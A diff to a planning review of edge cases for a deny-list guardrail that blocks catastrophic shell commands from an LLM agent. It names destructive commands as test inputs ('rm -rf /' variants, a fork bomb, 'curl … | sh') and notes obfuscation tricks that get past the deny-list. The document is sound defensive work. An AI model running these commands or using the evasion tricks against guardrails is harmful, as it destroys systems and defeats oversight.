@@ -1,41 +1,44 @@
-# Discover Edge Case Review — m3-catastrophic-shell
+# Edge Case Review — m3-catastrophic-shell (PLAN cycle)
 
 Date: 2026-06-20
-Discovery plan analyzed: .claude/knowledge-base/discoveries/plans/m3-catastrophic-shell-plan.md
-Research questions analyzed: 4
-Edge cases found: 4 (MUST FIX: 0, SHOULD TEST: 2, DOCUMENT: 2)
+Plan analyzed: knowledge-base/plans/m3-catastrophic-shell-plan.md
+Tasks analyzed: 2 (T1.1 guardrail primitive, T2.1 wiring)
+Edge cases found: 3 (MUST FIX: 0, SHOULD TEST: 2, DOCUMENT: 1)
 
-Cited paths (codex command_safety, opencode bash.ts, in-repo network-guard + shell-exec) verified by the baseline explorations.
+> Supersedes the discover-cycle edge-case review (EC-1 chaining/sudo + EC-2 curl|sh — absorbed into ADR D3 + T1.1 TDD). Plan-scoped review for `/plan-confidence`.
+
+## Boundary map
+
+`catastrophicShellReason` is a pure string analyzer (no I/O). Live edge family: parsing correctness (segment splitting vs fork-bomb internal pipes; rm target normalization). The screen runs before spawn → fails closed for the catastrophic set.
 
 ## MUST FIX
 
-(none — the deny-list is a heuristic guardrail with codex precedent; ADR D2 + the Q4 guardrail gate already lock the scope.)
+(none — pure function, fails-closed-before-spawn; the deny-list is a documented guardrail; chaining/sudo/pipe-to-shell absorbed into ADR D3 + the T1.1 TDD list.)
 
 ## SHOULD TEST
 
-### EC-1: command chaining + sudo prefix hides a catastrophic segment
-- **Affected question:** Q4
-- **Suggested halt-loop checkpoint:** the blueprint MUST screen each SEGMENT after splitting on `;` `&&` `||` `|` (and strip a leading `sudo`/`env`/`command` prefix), so `ls && rm -rf /` and `sudo rm -rf /` are caught, not just a bare `rm -rf /`. Pin a test per chaining operator + sudo prefix. (codex recurses into `sudo` and parses `bash -lc` — mirror the segment approach.)
+### EC-1: fork bomb contains internal pipes — must match whole-command, not be lost in segment splitting
+- **Affected task:** T1.1
+- **Family:** Format
+- **Scenario:** `:(){ :|:& };:` contains `|` and `;` — naive segment splitting would shred it. The fork-bomb detector must match the whole-command shape (a function defining `:` that pipes to itself), independent of the generic segment split used for the other patterns.
+- **Suggested test:** `test_blocks_fork_bomb` (already in T1.1) + ensure the implementation runs the fork-bomb regex on the RAW command before/besides segment splitting. Pin: `:(){ :|:& };:` → reason even though it has `|`/`;`.
 
-### EC-2: `curl … | sh` (and `wget | sh`) pipe-to-shell
-- **Affected question:** Q4
-- **Suggested halt-loop checkpoint:** the canonical remote-exec vector is `curl <url> | sh` / `wget -O- <url> | bash`. The segment screen must flag a pipe whose downstream segment is a shell (`sh`/`bash`/`zsh`) fed by a `curl`/`wget` upstream. Pin a test for `curl http://x | sh`.
+### EC-2: `rm -rf` target normalization (`/`, `//`, `/.`, `/ `, glob)
+- **Affected task:** T1.1
+- **Family:** Boundary
+- **Scenario:** `rm -rf //`, `rm -rf / `, `rm -rf /.` , `rm -rf /*` must all be caught; `rm -rf ./build/` allowed.
+- **Suggested test:** `test_blocks_rm_rf_root_variants` — `rm -rf //`, `rm -rf /*`, `rm -rf "/"` → reason; keep `test_allows_rm_rf_relative` for `./build`.
 
 ## DOCUMENT
 
-### EC-3: a deny-list is a GUARDRAIL, not a security boundary (bypassable)
-- **Accepted risk:** a determined agent can obfuscate (`$(echo <base64> | base64 -d)`, variable indirection, `eval`). The deny-list raises the bar against accidental/obvious catastrophic commands (the realistic failure mode for an LLM agent) — it is NOT a sandbox. The blueprint MUST state this honestly (the roadmap says "guardrail, não sandbox"); real isolation is a separate concern (codex's landlock sandbox, out of scope). The `allowCatastrophic` opt-out exists for trusted contexts.
-
-### EC-4: over-block on commands that merely MENTION a dangerous string
-- **Accepted risk:** `echo "how to rm -rf /"` or `git commit -m "remove with rm -rf"` could trip a naive substring match. Mitigation: match on the first token of each segment (the executable) + its flags, not arbitrary substrings — `rm` as the segment's command with `-rf`/`-fr`/`--recursive --force`, not the literal anywhere. Over-block is the safe failure for a guardrail; the opt-out covers false positives. Documented; the Q4 design uses command-position matching to minimize it.
+### EC-3: empty / whitespace-only / comment-only command
+- **Accepted risk:** `catastrophicShellReason("")` / `"   "` / `"# comment"` → `null` (nothing catastrophic to run). Safe default; documented. No action.
 
 ## Summary
 
-| Question | Edges | MUST FIX | SHOULD TEST | DOCUMENT |
-|----------|-------|----------|-------------|----------|
-| Q1 | 0 | 0 | 0 | 0 |
-| Q2 | 0 | 0 | 0 | 0 |
-| Q3 | 0 | 0 | 0 | 0 |
-| Q4 | 4 | 0 | EC-1, EC-2 | EC-3, EC-4 |
+| Task | Edges | MUST FIX | SHOULD TEST | DOCUMENT |
+|------|-------|----------|-------------|----------|
+| T1.1 | 3 | 0 | EC-1, EC-2 | EC-3 |
+| T2.1 | 0 | 0 | 0 | 0 |
 
-**Verdict:** DISCOVERY PLAN OK (no MUST FIX; 2 SHOULD-TEST — chaining/sudo + curl|sh — to fold into the execute halt-loop; 2 DOCUMENT — guardrail-not-sandbox + over-block stance)
+**Verdict:** PLAN OK (2 SHOULD TEST — fork-bomb-whole-match + rm-target-variants — fold into T1.1 TDD; no MUST FIX)
